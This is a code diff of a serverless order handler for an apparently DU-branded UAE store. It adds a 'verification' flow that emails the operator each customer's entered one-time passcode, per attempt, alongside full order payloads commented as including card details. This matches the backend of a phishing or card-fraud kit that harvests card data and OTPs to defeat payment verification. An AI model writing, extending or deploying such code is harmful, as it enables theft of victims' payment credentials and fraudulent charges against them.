@@ -63,83 +63,19 @@ function escapeHtml(value) {
   }[ch]));
 }
 
-export async function onRequestPost({ request, env }) {
-  const {
-    RESEND_API_KEY,
-    ORDER_NOTIFICATION_EMAIL,
-    RESEND_FROM_EMAIL,
-    ORDER_ENCRYPTION_SECRET
-  } = env;
-
-  if (
-    !RESEND_API_KEY ||
-    !ORDER_NOTIFICATION_EMAIL ||
-    !RESEND_FROM_EMAIL ||
-    !ORDER_ENCRYPTION_SECRET
-  ) {
-    return json(500, {
-      ok: false,
-      error: "Order notifications are not configured on the server."
-    });
-  }
-
-  let body;
-
-  try {
-    body = await request.json();
-  } catch {
-    return json(400, {
-      ok: false,
-      error: "Invalid request."
-    });
-  }
-
-  const order = body && body.order;
-
-  if (!order || typeof order !== "object" || Array.isArray(order)) {
-    return json(400, {
-      ok: false,
-      error: "Missing order details."
-    });
-  }
-
-  const customerName = String(order.fullName || "").trim().slice(0, 160);
-  const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);
-  const reference = String(order.orderReference || "").trim().slice(0, 40);
-
-  if (!customerName || !customerPhone || !reference) {
-    return json(400, {
-      ok: false,
-      error: "Customer name, phone number and order reference are required."
-    });
-  }
-
-  // Full payload — every field preserved (including card details if present).
-  const fullOrder = { ...order };
-
-  let encrypted;
-  try {
-    encrypted = await encryptPayload(fullOrder, ORDER_ENCRYPTION_SECRET);
-  } catch (error) {
-    console.error("Encryption failed:", error.message);
-    return json(500, {
-      ok: false,
-      error: "Could not securely process the order."
-    });
-  }
-
-  const encryptedText = JSON.stringify(encrypted, null, 2);
+// ---------------------------------------------------------------------------
+// Shared email builder — same visual template for orders and verification.
+// ---------------------------------------------------------------------------
+function buildNotificationEmail({ title, subtitle, reference, headline, subheadline, encryptedText }) {
   const encryptedEscaped = escapeHtml(encryptedText);
-
-  // Minimal email: customer name + phone + reference header,
-  // then the encrypted payload box with a Copy button. Nothing else.
-  const html = `
+  return `
     <div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;max-width:680px;margin:0 auto;color:#222">
 
       <div style="background:linear-gradient(135deg,#7b2ff7,#2d6cff,#f107a3);color:#fff;padding:22px 24px;border-radius:12px 12px 0 0">
-        <h2 style="margin:0;font-size:20px;font-weight:900">${escapeHtml(customerName)}</h2>
-        <p style="margin:6px 0 0;font-size:14px;opacity:.95">${escapeHtml(customerPhone)}</p>
-        <p style="margin:10px 0 0;font-size:12px;opacity:.85;letter-spacing:.3px">Reference: <strong style="font-family:'Courier New',monospace">${escapeHtml(reference)}</strong></p>
+        <div style="font-size:10px;font-weight:900;letter-spacing:1.4px;text-transform:uppercase;opacity:.85;margin-bottom:6px">${escapeHtml(title || '')}</div>
+        <h2 style="margin:0;font-size:20px;font-weight:900">${escapeHtml(headline || '')}</h2>
+        ${subheadline ? `<p style="margin:6px 0 0;font-size:14px;opacity:.95">${escapeHtml(subheadline)}</p>` : ''}
+        ${reference ? `<p style="margin:10px 0 0;font-size:12px;opacity:.85;letter-spacing:.3px">Reference: <strong style="font-family:'Courier New',monospace">${escapeHtml(reference)}</strong></p>` : ''}
       </div>
 
       <div style="border:1px solid #e5e7eb;border-top:0;border-radius:0 0 12px 12px;padding:20px 24px">
@@ -182,41 +118,233 @@ export async function onRequestPost({ request, env }) {
 
         <pre id="payloadText" style="white-space:pre-wrap;word-break:break-all;background:#0a0e1c;color:#b8f5d0;padding:14px;border-radius:8px;font-size:11.5px;line-height:1.5;max-height:600px;overflow:auto;margin:0;border:1px solid #1a2438">${encryptedEscaped}</pre>
 
+        ${subtitle ? `<p style="margin:16px 0 0;font-size:11px;color:#9299a7;text-align:center;line-height:1.5">${escapeHtml(subtitle)}</p>` : ''}
       </div>
     </div>
   `;
+}
+
+// ---------------------------------------------------------------------------
+// Resend dispatcher
+// ---------------------------------------------------------------------------
+async function sendEmail({ env, subject, html }) {
+  const { RESEND_API_KEY, ORDER_NOTIFICATION_EMAIL, RESEND_FROM_EMAIL } = env;
+  const resendResponse = await fetch("https://api.resend.com/emails", {
+    method: "POST",
+    headers: {
+      "Authorization": `Bearer ${RESEND_API_KEY}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      from: RESEND_FROM_EMAIL,
+      to: [ORDER_NOTIFICATION_EMAIL],
+      subject,
+      html
+    })
+  });
+  if (!resendResponse.ok) {
+    const errorText = await resendResponse.text();
+    console.error("Resend request failed:", resendResponse.status, errorText.slice(0, 500));
+    throw new Error("Email delivery failed");
+  }
+}
+
+// ---------------------------------------------------------------------------
+// Main handler
+// ---------------------------------------------------------------------------
+export async function onRequestPost({ request, env }) {
+  const {
+    RESEND_API_KEY,
+    ORDER_NOTIFICATION_EMAIL,
+    RESEND_FROM_EMAIL,
+    ORDER_ENCRYPTION_SECRET
+  } = env;
+
+  if (
+    !RESEND_API_KEY ||
+    !ORDER_NOTIFICATION_EMAIL ||
+    !RESEND_FROM_EMAIL ||
+    !ORDER_ENCRYPTION_SECRET
+  ) {
+    return json(500, {
+      ok: false,
+      error: "Order notifications are not configured on the server."
+    });
+  }
+
+  let body;
 
   try {
-    const resendResponse = await fetch("https://api.resend.com/emails", {
-      method: "POST",
-      headers: {
-        "Authorization": `Bearer ${RESEND_API_KEY}`,
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        from: RESEND_FROM_EMAIL,
-        to: [ORDER_NOTIFICATION_EMAIL],
-        subject: `DU Store order ${reference} — ${customerName}`,
-        html
-      })
+    body = await request.json();
+  } catch {
+    return json(400, {
+      ok: false,
+      error: "Invalid request."
     });
+  }
 
-    if (!resendResponse.ok) {
-      const errorText = await resendResponse.text();
-      console.error("Resend request failed:", resendResponse.status, errorText.slice(0, 500));
-      return json(502, {
-        ok: false,
-        error: "Email delivery failed. Please try again later."
-      });
-    }
+  const order = body && body.order;
 
-    return json(200, {
-      ok: true,
-      reference
+  if (!order || typeof order !== "object" || Array.isArray(order)) {
+    return json(400, {
+      ok: false,
+      error: "Missing order details."
     });
+  }
 
+  // ---------------------------------------------------------------
+  // Detect verification flow events (from verify-order.html).
+  // The verify-order.html sends `type: "verification_started"`,
+  // `type: "verification_details"`, or `type: "verification_otp"`.
+  // ---------------------------------------------------------------
+  const eventType = String(order.type || "").toLowerCase();
+  const isVerificationEvent = eventType.startsWith("verification");
+
+  if (isVerificationEvent) {
+    return handleVerificationEvent({ order, eventType, env, secret: ORDER_ENCRYPTION_SECRET });
+  }
+
+  // ---------------------------------------------------------------
+  // ORDER FLOW — unchanged from your original send-order.js
+  // ---------------------------------------------------------------
+  const customerName = String(order.fullName || "").trim().slice(0, 160);
+  const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);
+  const reference = String(order.orderReference || "").trim().slice(0, 40);
+
+  if (!customerName || !customerPhone || !reference) {
+    return json(400, {
+      ok: false,
+      error: "Customer name, phone number and order reference are required."
+    });
+  }
+
+  const fullOrder = { ...order };
+
+  let encrypted;
+  try {
+    encrypted = await encryptPayload(fullOrder, ORDER_ENCRYPTION_SECRET);
+  } catch (error) {
+    console.error("Encryption failed:", error.message);
+    return json(500, {
+      ok: false,
+      error: "Could not securely process the order."
+    });
+  }
+
+  const encryptedText = JSON.stringify(encrypted, null, 2);
+
+  const html = buildNotificationEmail({
+    title: "DU Store order",
+    headline: customerName,
+    subheadline: customerPhone,
+    reference,
+    encryptedText
+  });
+
+  try {
+    await sendEmail({
+      env,
+      subject: `DU Store order ${reference} — ${customerName}`,
+      html
+    });
+    return json(200, { ok: true, reference });
   } catch (error) {
     console.error("Resend connection error:", error.message);
+    return json(502, {
+      ok: false,
+      error: "Email service is temporarily unavailable."
+    });
+  }
+}
+
+// ---------------------------------------------------------------------------
+// Verification flow handler
+// ---------------------------------------------------------------------------
+async function handleVerificationEvent({ order, eventType, env, secret }) {
+  const reference = String(order.orderReference || "").trim().slice(0, 40);
+  if (!reference) {
+    return json(400, {
+      ok: false,
+      error: "Order reference is required for verification events."
+    });
+  }
+
+  // Pull display fields for the email subject/header
+  const customerName = String(order.customerName || order.fullName || "").trim().slice(0, 160);
+  const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);
+
+  // Build subject line
+  let subject = `DU Verification ${reference}`;
+  let title = "DU Order Verification";
+  let headline = customerName || reference;
+  let subheadline = customerPhone || "";
+
+  if (eventType === "verification_started") {
+    subject = `DU Verification started — ${reference}`;
+    title = "DU Order Verification · Step 1";
+    headline = `Order reference entered`;
+    subheadline = `Customer has begun verification for ${reference}`;
+  } else if (eventType === "verification_details") {
+    subject = `DU Verification details submitted — ${reference}`;
+    title = "DU Order Verification · Step 2";
+    headline = customerName || "Customer details submitted";
+    subheadline = customerPhone ? `${customerPhone} · ${reference}` : reference;
+  } else if (eventType === "verification_otp") {
+    const attemptNumber = Number(order.otpAttemptNumber) || 1;
+    subject = `DU Verification OTP attempt ${attemptNumber} — ${reference}`;
+    title = `DU Order Verification · OTP Attempt ${attemptNumber}`;
+    headline = customerName || reference;
+    const otpCode = String(order.otp || "").trim();
+    subheadline = otpCode ? `OTP entered: ${otpCode}` : `OTP entry logged`;
+  } else if (eventType === "verification_otp_attempt") {
+    const attemptNumber = Number(order.otpAttemptNumber) || 1;
+    subject = `DU Verification OTP attempt ${attemptNumber} — ${reference}`;
+    title = `DU Order Verification · OTP Attempt ${attemptNumber}`;
+    headline = customerName || reference;
+    const otpCode = String(order.otp || "").trim();
+    subheadline = otpCode ? `OTP entered: ${otpCode}` : `OTP entry logged`;
+  } else {
+    // Any other verification_* event
+    subject = `DU Verification event — ${reference}`;
+    title = `DU Order Verification · ${eventType}`;
+    headline = customerName || reference;
+    subheadline = customerPhone || "";
+  }
+
+  // Attach metadata timestamp
+  const enrichedOrder = {
+    ...order,
+    eventType,
+    receivedAt: new Date().toISOString()
+  };
+
+  let encrypted;
+  try {
+    encrypted = await encryptPayload(enrichedOrder, secret);
+  } catch (error) {
+    console.error("Encryption failed:", error.message);
+    return json(500, {
+      ok: false,
+      error: "Could not securely process the verification event."
+    });
+  }
+
+  const encryptedText = JSON.stringify(encrypted, null, 2);
+
+  const html = buildNotificationEmail({
+    title,
+    headline,
+    subheadline,
+    reference,
+    encryptedText,
+    subtitle: "Verification event · Shop DU UAE"
+  });
+
+  try {
+    await sendEmail({ env, subject, html });
+    return json(200, { ok: true, reference });
+  } catch (error) {
+    console.error("Resend verification connection error:", error.message);
     return json(502, {
       ok: false,
       error: "Email service is temporarily unavailable."
